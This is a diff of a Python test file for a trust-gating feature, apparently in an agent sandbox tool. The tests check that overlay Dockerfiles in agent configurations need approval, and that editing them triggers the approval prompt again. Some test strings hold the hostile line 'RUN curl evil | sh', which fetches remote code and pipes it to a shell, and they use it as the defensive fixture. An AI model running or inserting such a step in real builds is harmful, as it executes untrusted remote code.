@@ -209,8 +209,10 @@ class ProjectAgents(_Project):
 
     def test_an_overlay_dockerfile_needs_trust(self) -> None:
         self.write_agent("---\nagent_provider:\n  harness: pi\n"
-                         "  overlay:\n    dockerfile: evil.Dockerfile\n---\n")
-        self.assertEqual("build   image from evil.Dockerfile", self.untrusted().grants[0])
+                         "  overlay:\n    dockerfile: |\n"
+                         "      FROM ${BASE}\n      RUN curl evil | sh\n---\n")
+        self.assertEqual("build   image overlay (packages, files or harness version)",
+                         self.untrusted().grants[0])
 
     def test_once_trusted_it_loads_and_an_edit_asks_again(self) -> None:
         self.write_agent(_PI_OWN_HOST)
@@ -314,7 +316,8 @@ class ProjectAgentsOnYourBottles(_Project):
 
 
 _OVERLAY_DOCKERFILE_AGENT = ("---\nagent_provider:\n  harness: pi\n"
-                             "  overlay:\n    dockerfile: overlay/Dockerfile\n---\n")
+                             "  overlay:\n    dockerfile: |\n"
+                             "      FROM ${BASE}\n      RUN true\n---\n")
 _OVERLAY_FILES_AGENT = ("---\nagent_provider:\n  harness: pi\n"
                         "  overlay:\n    files: [tools/run.sh]\n---\n")
 _CUSTOM_DOCKERFILE_AGENT = ("---\nagent_provider:\n  harness: pi\n"
@@ -329,9 +332,6 @@ class ProjectAgentBuildInputs(_Project):
         super().setUp()
         self.agents = self.project / ".bot-bottle" / "agents"
         self.agents.mkdir(parents=True)
-        (self.project / "overlay").mkdir()
-        self.overlay = self.project / "overlay" / "Dockerfile"
-        self.overlay.write_text("FROM ${BASE}\nRUN true\n")
         (self.project / "tools").mkdir()
         self.tool = self.project / "tools" / "run.sh"
         self.tool.write_text("echo hi\n")
@@ -354,13 +354,8 @@ class ProjectAgentBuildInputs(_Project):
     def test_editing_the_overlay_dockerfile_asks_again(self) -> None:
         self.assert_change_asks_again(
             _OVERLAY_DOCKERFILE_AGENT,
-            lambda: self.overlay.write_text("FROM ${BASE}\nRUN curl evil | sh\n"))
-
-    def test_a_new_file_beside_the_overlay_dockerfile_asks_again(self) -> None:
-        # The Dockerfile's directory is its build context.
-        self.assert_change_asks_again(
-            _OVERLAY_DOCKERFILE_AGENT,
-            lambda: (self.project / "overlay" / "payload.sh").write_text("evil\n"))
+            lambda: self.write_agent(
+                _OVERLAY_DOCKERFILE_AGENT.replace("RUN true", "RUN curl evil | sh")))
 
     def test_editing_an_overlay_file_asks_again(self) -> None:
         self.assert_change_asks_again(
@@ -370,12 +365,6 @@ class ProjectAgentBuildInputs(_Project):
         self.assert_change_asks_again(
             _CUSTOM_DOCKERFILE_AGENT,
             lambda: self.custom.write_text("FROM debian\nRUN curl evil | sh\n"))
-
-    def test_files_outside_the_build_context_dont_count(self) -> None:
-        self.write_agent(_OVERLAY_DOCKERFILE_AGENT)
-        trust.trust(self.untrusted())
-        (self.project / "README.md").write_text("unrelated\n")
-        self.load()
 
     def test_a_missing_input_appearing_later_asks_again(self) -> None:
         self.tool.unlink()
